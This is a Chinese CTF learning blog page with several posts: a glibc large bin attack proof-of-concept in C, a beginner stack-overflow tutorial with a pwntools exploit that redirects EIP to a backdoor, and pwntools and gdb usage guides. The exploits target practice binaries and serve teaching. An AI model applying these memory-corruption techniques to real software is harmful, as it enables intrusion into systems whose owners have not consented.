<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  

  
  <title>PWN? PWN!</title>
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <meta property="og:type" content="website">
<meta property="og:title" content="PWN? PWN!">
<meta property="og:url" content="https://charlieleex.github.io/index.html">
<meta property="og:site_name" content="PWN? PWN!">
<meta property="og:locale" content="default">
<meta name="twitter:card" content="summary">
<meta name="twitter:title" content="PWN? PWN!">
  
    <link rel="alternate" href="/atom.xml" title="PWN? PWN!" type="application/atom+xml">
  
  
    <link rel="icon" href="/favicon.png">
  
  
    <link href="//fonts.googleapis.com/css?family=Source+Code+Pro" rel="stylesheet" type="text/css">
  
  <link rel="stylesheet" href="/css/style.css">
</head>

<body>
  <div id="container">
    <div id="wrap">
      <header id="header">
  <div id="banner"></div>
  <div id="header-outer" class="outer">
    <div id="header-title" class="inner">
      <h1 id="logo-wrap">
        <a href="/" id="logo">PWN? PWN!</a>
      </h1>
      
    </div>
    <div id="header-inner" class="inner">
      <nav id="main-nav">
        <a id="main-nav-toggle" class="nav-icon"></a>
        
          <a class="main-nav-link" href="/">Home</a>
        
          <a class="main-nav-link" href="/archives">Archives</a>
        
      </nav>
      <nav id="sub-nav">
        
          <a id="nav-rss-link" class="nav-icon" href="/atom.xml" title="RSS Feed"></a>
        
        <a id="nav-search-btn" class="nav-icon" title="Search"></a>
      </nav>
      <div id="search-form-wrap">
        <form action="//google.com/search" method="get" accept-charset="UTF-8" class="search-form"><input type="search" name="q" class="search-form-input" placeholder="Search"><button type="submit" class="search-form-submit">&#xF002;</button><input type="hidden" name="sitesearch" value="https://charlieleex.github.io"></form>
      </div>
    </div>
  </div>
</header>
      <div class="outer">
        <section id="main">
  
    <article id="post-large-bin-attack-学习记录" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/08/15/large-bin-attack-学习记录/" class="article-date">
  <time datetime="2018-08-15T01:51:07.000Z" itemprop="datePublished">2018-08-15</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/08/15/large-bin-attack-学习记录/">large bin attack 学习记录</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>这两天去看了下large bin attack的一些东西，有一种攻击方法比较没用，只是能alloc自己控制的chunk里面的内容，但是这个unsorted bin也可以做到，不用这么麻烦</p>
<p>然后记忆中0ctf quals有一题heapstorm2也是 large bin attack，于是去看了下</p>
<p>这里给下dalao的博客</p>
<p><a href="https://veritas501.space/2018/04/11/Largebin%20%E5%AD%A6%E4%B9%A0/" target="_blank" rel="noopener">Largebin 学习</a></p>
<p>真的讲得不错</p>
<p>然后看到heapstorm2的解析，真的惊为天人，非常优雅的攻击方法</p>
<p>总结一下，大概就是unsorted bin 插入large bin list的时候，会触发一个任意地址写堆地址</p>
<p>然后跳出unsorted bin 循环之后，还会有一个任意地址写堆地址</p>
<p>然后可以伪造一个大小为0x50的chunk</p>
<p>这个时候就相当于可以alloc到任意想要的地方</p>
<p>攻击方法可以总结为下面的c语言代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;unistd.h&gt;</span><br><span class="line">#include &lt;sys/mman.h&gt;</span><br><span class="line"></span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">    //only for init</span><br><span class="line">    setbuf(stdin,0);</span><br><span class="line">    setbuf(stdout,0);</span><br><span class="line"></span><br><span class="line">    //map a fixed address memory</span><br><span class="line">    mmap((void*)0x13370000,0x1000,3,34,-1,0);</span><br><span class="line"></span><br><span class="line">    //malloc 2 large bin</span><br><span class="line">    long long* h1=malloc(0x418);</span><br><span class="line">    malloc(0x18);</span><br><span class="line">    long long* h2=malloc(0x428);</span><br><span class="line">    malloc(0x18);</span><br><span class="line">    </span><br><span class="line">    //make the small one into large bin list</span><br><span class="line">    free(h1);</span><br><span class="line">    malloc(0x500);</span><br><span class="line"></span><br><span class="line">    //make the bigger one into unsorted bin list</span><br><span class="line">    free(h2);</span><br><span class="line">    </span><br><span class="line">    //change the small one&apos;s bk and bk_nextsize ,the 0xdeadbeef only show that fd and fd_nextsize doesn&apos;t matter</span><br><span class="line">    </span><br><span class="line">    h1[0]=0xdeadbeef;</span><br><span class="line">    h1[1]=0x13370000-0x10+3;</span><br><span class="line">    h1[2]=0xdeadbeef;</span><br><span class="line">    h1[3]=0x13370018-0x20;</span><br><span class="line"></span><br><span class="line">    //change the unsorted bin&apos;s bk</span><br><span class="line">    h2[0]=0xdeadbeef;</span><br><span class="line">    h2[1]=0x13370000;</span><br><span class="line">    </span><br><span class="line">    //triger the bug and alloc where you want, but it need your luck</span><br><span class="line">    long long * h3=malloc(0x48);</span><br><span class="line">    printf(&quot;you are luck and get %p\n&quot;,h3);</span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
      
    </div>
    <footer class="article-footer">
      <a data-url="https://charlieleex.github.io/2018/08/15/large-bin-attack-学习记录/" data-id="cjkuhp55r0000q0u5rikuhh7x" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-pwn从入门到放弃第六章——简单ROP" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/07/29/pwn从入门到放弃第六章——简单ROP/" class="article-date">
  <time datetime="2018-07-29T14:37:07.000Z" itemprop="datePublished">2018-07-29</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/29/pwn从入门到放弃第六章——简单ROP/">pwn从入门到放弃第六章——简单ROP</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>简单预告一下，有空填</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://charlieleex.github.io/2018/07/29/pwn从入门到放弃第六章——简单ROP/" data-id="cjkuhp5cj0004q0u5es18tkck" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-pwn从入门到放弃第五章——最简简简简简简单的栈溢出" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/" class="article-date">
  <time datetime="2018-07-20T02:25:23.000Z" itemprop="datePublished">2018-07-20</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/">pwn从入门到放弃第五章——最简简简简简简单的栈溢出</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>现在我们来介绍一下最简单的栈溢出吧</p>
<p>首先先来下载一个程序</p>
<p><a href="https://github.com/charlieleex/charlieleex.github.io/tree/master/2018/07/20/pwn%E4%BB%8E%E5%85%A5%E9%97%A8%E5%88%B0%E6%94%BE%E5%BC%83%E7%AC%AC%E4%BA%94%E7%AB%A0%E2%80%94%E2%80%94%E6%9C%80%E7%AE%80%E7%AE%80%E7%AE%80%E7%AE%80%E7%AE%80%E7%AE%80%E5%8D%95%E7%9A%84%E6%A0%88%E6%BA%A2%E5%87%BA/pwn_level1" target="_blank" rel="noopener">pwn_level1</a></p>
<p>下载完之后，我们用32位的ida打开</p>
<p>反编译看到main函数</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t1.png" alt=""></p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t2.png" alt=""><br>这里很明显就有一个栈溢出</p>
<p>我们把程序复制进虚拟机中</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t3.png" alt=""></p>
<p>然后会显示./pwn_level1: No such file or directory</p>
<p>这是因为我们装的是64位系统，而这个程序是32位的</p>
<p>我们可以执行下面的命令，安装一些东西来运行32位程序</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">apt-get install lib32z1 lib32ncurses5</span><br></pre></td></tr></table></figure>
<p>安装完之后，再运行程序</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t4.png" alt=""></p>
<p>这样就能正常的运行和调试了</p>
<h3 id="第一步，计算控制程序eip所需要的字符数量"><a href="#第一步，计算控制程序eip所需要的字符数量" class="headerlink" title="第一步，计算控制程序eip所需要的字符数量"></a>第一步，计算控制程序eip所需要的字符数量</h3><p>到了这里，需要有一些汇编的基础</p>
<p>这里给下几篇简单入门的教程，不过最好可以系统的学一下，书我推荐王爽的《汇编语言》</p>
<p><a href="https://blog.csdn.net/q_l_s/article/details/54925771" target="_blank" rel="noopener">X86汇编快速入门</a></p>
<p><a href="https://blog.csdn.net/cagent_z/article/details/57409433" target="_blank" rel="noopener">从一段x86汇编程序看计算机是如何工作</a></p>
<p>看完上面那两个教程之后，我们来计算一下控制程序eip所需要的字符数量</p>
<p>cd 到Desktop，然后输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim level1.py</span><br></pre></td></tr></table></figure>
<p>对了，这里还需要简单学一下vim的操作</p>
<p><a href="https://www.cnblogs.com/harry335/p/5886405.html" target="_blank" rel="noopener">Vim教程</a></p>
<p>简单学一下基础就可以了，不用学得太深</p>
<p>我们在level1.py里面写入下面的代码</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&apos;./pwn_level1&apos;)</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;try to stackoverflow!!&apos;)</span><br><span class="line"></span><br><span class="line">p.send(cyclic(0x100))</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>保存，然后在terminal下面运行</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python level1.py</span><br></pre></td></tr></table></figure>
<p>运行之后会出现<br><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t5.png" alt=""></p>
<p>在gdb那个窗口下面输入c，然后回车</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t6.png" alt=""></p>
<p>发现程序停在了这里，这是因为我们栈溢出，控制了eip，eip变成0x65616161，但是这个地址跳转不了</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">print(cyclic_find(0x65616161))</span><br></pre></td></tr></table></figure>
<p>在代码后面加上这句</p>
<p>然后再运行一次，打印出13，看来偏移是13</p>
<p>所以我们只要填充13个字符就能控制到eip了</p>
<h3 id="第二步，跳转到后门"><a href="#第二步，跳转到后门" class="headerlink" title="第二步，跳转到后门"></a>第二步，跳转到后门</h3><p>我们在ida里面看到</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t7.png" alt=""></p>
<p>有一个后门函数，地址是在804849A开始的</p>
<p>我们如果想跳转到这里，只要填充13个字符，再加上p32(0x804849A)就可以了</p>
<p>所以最终的payload是</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">p=process(&apos;./pwn_level1&apos;)</span><br><span class="line">context.log_level=&apos;debug&apos;</span><br><span class="line">gdb.attach(p)</span><br><span class="line"></span><br><span class="line">p.recvuntil(&apos;try to stackoverflow!!&apos;)</span><br><span class="line"></span><br><span class="line">p.send(&apos;a&apos;*13+p32(0x804849A))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>运行一下，在运行脚本那个terminal输入ls，可以看到打印了桌面的文件</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t8.png" alt=""></p>
<h3 id="简单了解一下这样做的原理"><a href="#简单了解一下这样做的原理" class="headerlink" title="简单了解一下这样做的原理"></a>简单了解一下这样做的原理</h3><p>我们用gdb调试程序，在80484C4这个地址下个断点</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t9.png" alt=""></p>
<p>这里是call vulnerable_function</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t10.png" alt=""></p>
<p>输入r运行</p>
<p>我们可以看下这个时候，ebp和esp的值</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t11.png" alt=""></p>
<p>再输入s</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t12.png" alt=""></p>
<p>可以看到esp减少了0x4</p>
<p>而且栈顶现在是0x80484c9，是call vulnerable_function下一条指令的地址</p>
<p>所以我们可以知道</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">call function</span><br></pre></td></tr></table></figure>
<p>等价于<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">push eip+x</span><br><span class="line">jmp function</span><br></pre></td></tr></table></figure></p>
<p>这样做是为了调用完函数之后，能顺利的返回</p>
<p>然后我们看下vulnerable_function函数里面的东西</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t13.png" alt=""></p>
<p>前3行是将ebp压入栈，然后将当前的esp转移到ebp，再将esp减去0x18</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t14.png" alt=""></p>
<p>最后三行是将esp加上0x10</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">leave </span><br><span class="line">=</span><br><span class="line">mov esp,ebp</span><br><span class="line">pop ebp</span><br></pre></td></tr></table></figure>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">retn = pop eip</span><br></pre></td></tr></table></figure>
<p>然后我们将这个流程用图示来显示</p>
<p>这个是一开始停在call vulnerable_function那里的栈的大概示意图</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t15.png" alt=""></p>
<p>这个是刚进到函数里面时的情况</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t16.png" alt=""></p>
<p>这是执行完push ebp后的情况</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t17.png" alt=""></p>
<p>这个是执行完mov ebp,esp之后</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t18.png" alt=""></p>
<p>执行完sub esp,0x18后</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t19.png" alt=""></p>
<p>然后我们可以在gdb调试一下，然后发现执行完add esp,0x10之后，栈的状况又回到了</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t19.png" alt=""></p>
<p>执行完leave后</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t16.png" alt=""></p>
<p>执行完ret后<br><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t15.png" alt=""></p>
<p>这个是正常的流程，假如我们用cyclic(0x100)来栈溢出呢？</p>
<p>执行完read之后就变成这样了</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t20.png" alt=""></p>
<p>原本保存ebp和返回地址的地方现在被我们输入的内容给覆盖，这里可能有点画得不准确，大概明白就行</p>
<p>执行leave之后就变成</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t21.png" alt=""></p>
<p>再执行retn就变成</p>
<p><img src="/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/t22.png" alt=""></p>
<p>这个就是为什么我们栈溢出能控制程序eip的原因了</p>
<p>我们只需要把0x65616161替换成我们想跳转的地址，就能跳转到那个地方</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://charlieleex.github.io/2018/07/20/pwn从入门到放弃第五章——最简简简简简简单的栈溢出/" data-id="cjkuhp5cn0005q0u584cflqgs" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-pwn从入门到放弃第四章——pwntools的基本使用教程" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/07/19/pwn从入门到放弃第四章——pwntools的基本使用教程/" class="article-date">
  <time datetime="2018-07-19T05:01:20.000Z" itemprop="datePublished">2018-07-19</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/07/19/pwn从入门到放弃第四章——pwntools的基本使用教程/">pwn从入门到放弃第四章——pwntools的基本使用教程</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>pwntools是除了ida和gdb以外最常用的工具，python的语法并不难，大概只要懂一些c和c++的编程，转换到python的编程非常简单</p>
<p>这里随便给一个教程，你也可以找其他自己觉得好的教程学一下</p>
<p><a href="https://www.liaoxuefeng.com/wiki/001374738125095c955c1e6d8bb493182103fac9270762a000" target="_blank" rel="noopener">python教程</a></p>
<p>基本学一下循环，函数之类的就可以直接写python了</p>
<p>这里还要说一下，pwntools只能安装在python2下面，所以语法什么的都是python2的，但是如果学过python3的也很容易转换过来</p>
<p>这里写给一下我pwntools脚本的模板</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">debug=1</span><br><span class="line">if debug:</span><br><span class="line">    p=process(&apos;&apos;)</span><br><span class="line">    #p=process(&apos;&apos;,env=&#123;&apos;LD_PRELOAD&apos;:&apos;./libc.so&apos;&#125;)</span><br><span class="line">    context.log_level=&apos;debug&apos;</span><br><span class="line">    gdb.attach(p)</span><br><span class="line">else:</span><br><span class="line">    p=remote(&apos;&apos;)</span><br><span class="line"></span><br><span class="line">def ru(x):</span><br><span class="line">    return p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">def se(x):</span><br><span class="line">    p.send(x)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>这里介绍一下pwntools比较有用的函数</p>
<p>我们可以打开terminal，输入python，进入python的交互命令行，然后再输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">from pwn import *</span><br></pre></td></tr></table></figure>
<h3 id="p32-p64"><a href="#p32-p64" class="headerlink" title="p32 p64"></a>p32 p64</h3><p>就是将一个数字转换为字符，例如</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p32(0xdeadbeef)</span><br></pre></td></tr></table></figure>
<p>就会转换为<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;\xef\xbe\xad\xde&apos;</span><br></pre></td></tr></table></figure></p>
<p>这里顺序反了是因为linux编译的程序是小端序的</p>
<h3 id="u32-u64"><a href="#u32-u64" class="headerlink" title="u32 u64"></a>u32 u64</h3><p>就是将字符转换为数字，例如<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">u32(&apos;\x12\x34\x56\x78&apos;)</span><br></pre></td></tr></table></figure></p>
<p>结果</p>
<p><img src="/2018/07/19/pwn从入门到放弃第四章——pwntools的基本使用教程/t1.png" alt=""></p>
<p>这里可能要解释下，\x78是一个字符，代表的是16进制78的ascii字符</p>
<p><img src="/2018/07/19/pwn从入门到放弃第四章——pwntools的基本使用教程/t2.png" alt=""></p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x78=120=&apos;x&apos;</span><br><span class="line">0x56=86=&apos;V&apos;</span><br></pre></td></tr></table></figure>
<h3 id="cyclic"><a href="#cyclic" class="headerlink" title="cyclic"></a>cyclic</h3><p>这个是一个在栈溢出或者各种需要找偏移的时候比较有用的函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic(40)</span><br></pre></td></tr></table></figure>
<p>这是生成40个字节长的字符串，这个字符串是按照一定规律来生成的</p>
<p><img src="/2018/07/19/pwn从入门到放弃第四章——pwntools的基本使用教程/t3.png" alt=""></p>
<p>假如说我想找aaaj这个字符串的偏移，我们可以用<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cyclic_find(&apos;aaaj&apos;)</span><br></pre></td></tr></table></figure></p>
<p><img src="/2018/07/19/pwn从入门到放弃第四章——pwntools的基本使用教程/t4.png" alt=""></p>
<h3 id="接下来解释下我模板中定义的ru和se函数"><a href="#接下来解释下我模板中定义的ru和se函数" class="headerlink" title="接下来解释下我模板中定义的ru和se函数"></a>接下来解释下我模板中定义的ru和se函数</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">def ru(x):</span><br><span class="line">    return p.recvuntil(x)</span><br><span class="line"></span><br><span class="line">def se(x):</span><br><span class="line">    p.send(x)</span><br></pre></td></tr></table></figure>
<p>这里的p是由<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">p=process(&apos;&apos;)</span><br><span class="line">或</span><br><span class="line">p=remote(&apos;&apos;)</span><br></pre></td></tr></table></figure></p>
<p>赋值的，process是指运行本地的程序，remote是指连接远程的服务器<br>这里给下process和remote的例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">p=process(&apos;./babystack&apos;)</span><br><span class="line">p=remote(&apos;123.123.123.123&apos;,8888)</span><br></pre></td></tr></table></figure>
<p>回到函数，p.recvuntil，这个很明显就是接收字符串直到接收到x</p>
<p>这里给个运用的例子</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ru(&apos;Hello World&apos;)</span><br></pre></td></tr></table></figure>
<p>这里就是说明接收字符串，直到接收到Hello World</p>
<p>而p.send就是发送字符串</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">se(&apos;Hi!&apos;)</span><br></pre></td></tr></table></figure>
<p>这里就是发送 Hi! 给程序或者远程服务器</p>
<p>其实pwntools还有另外一个函数</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">p.sendline(&apos;xxxx&apos;)</span><br></pre></td></tr></table></figure>
<p>这里就是发送 ‘xxxx\n’ 给程序或者服务器</p>
<h3 id="接下来解释下模板中的gdb-attach"><a href="#接下来解释下模板中的gdb-attach" class="headerlink" title="接下来解释下模板中的gdb.attach"></a>接下来解释下模板中的gdb.attach</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb.attach(p)</span><br></pre></td></tr></table></figure>
<p>这个是用于本地程序调试的，gdb可以附加到一个正在运行的程序上面，进行调试</p>
<p>gdb attach一般会停在read的syscall那里，等待输入，因为gdb attach是附加到正在运行的程序上面，而p=process之后，程序停在了等待输入那里，所以gdb附加上去之后就停在read 的syscall那里</p>
<p>之后的各种操作就和gdb使用教程教的一样</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://charlieleex.github.io/2018/07/19/pwn从入门到放弃第四章——pwntools的基本使用教程/" data-id="cjkuhp5cp0006q0u5tz28hlz2" class="article-share-link">Share</a>
      
      
    </footer>
  </div>
  
</article>


  
    <article id="post-pwn从入门到放弃第三章——gdb的基本使用教程" class="article article-type-post" itemscope itemprop="blogPost">
  <div class="article-meta">
    <a href="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/" class="article-date">
  <time datetime="2018-06-22T01:32:49.000Z" itemprop="datePublished">2018-06-22</time>
</a>
    
  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="article-title" href="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/">pwn从入门到放弃第三章——gdb的基本使用教程</a>
    </h1>
  

      </header>
    
    <div class="article-entry" itemprop="articleBody">
      
        <p>考完试了，来填坑</p>
<p>gdb在做题中经常用到，熟练掌握gdb会事半功倍</p>
<p>我们继续用第二章中的程序来讲解gdb的使用</p>
<p>将程序直接拖进vmware中，因为我们下的vmware专用版本的kali，所以已经安装好vmware tool之类的，直接拖进去或者复制粘贴进去就可以了</p>
<p>打开terminal，cd到Desktop</p>
<p>先给程序加可执行权限，在terminal输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chmod 777 babystack</span><br></pre></td></tr></table></figure>
<p>然后输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gdb ./babystack</span><br></pre></td></tr></table></figure></p>
<p>然后就会出现如下图一样的界面</p>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t1.png" alt=""></p>
<p>接下面介绍gdb比较实用的两个功能</p>
<h4 id="checksec"><a href="#checksec" class="headerlink" title="checksec"></a>checksec</h4><p>在gdb的termial中输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">checksec</span><br></pre></td></tr></table></figure>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t2.png" alt=""></p>
<p>checksec是用来显示程序保护机制的开启情况</p>
<p>我们来解释下显示的东西</p>
<ul>
<li>Arch，很明显就是程序是多少位的，这里是64位的</li>
<li>RELRO，这里是Full RELRO，RELRO的全程是RELocation Read-Only，重定位只读（渣翻译不要吐槽，开启了这个之后got表是只读的，不能往里面写东西，got表这个概念会在后面介绍，这里先知道这个名词就可以了，除此之外还有其他东西改变了，深入下去可以完全当一章来写</li>
<li>Stack: 这里是栈溢出保护，保护的机制也暂时先不谈</li>
<li>NX： 这里是堆栈不可执行，也就是堆和栈没有执行权限，这个也会在后面ret2shellcode那章解释</li>
<li>PIE：地址重定位，开启了PIE和没有开启PIE是两种不同的难度，而且开启了PIE会使程序调试起来比较麻烦</li>
</ul>
<h4 id="vmmap"><a href="#vmmap" class="headerlink" title="vmmap"></a>vmmap</h4><p>vmmap是用来查看程序各种段的地址和范围的，会经常用到</p>
<p>在gdb的terminal中输入</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vmmap</span><br></pre></td></tr></table></figure>
<p><img src="/2018/06/22/pwn从入门到放弃第三章——gdb的基本使用教程/t3.png" alt=""></p>
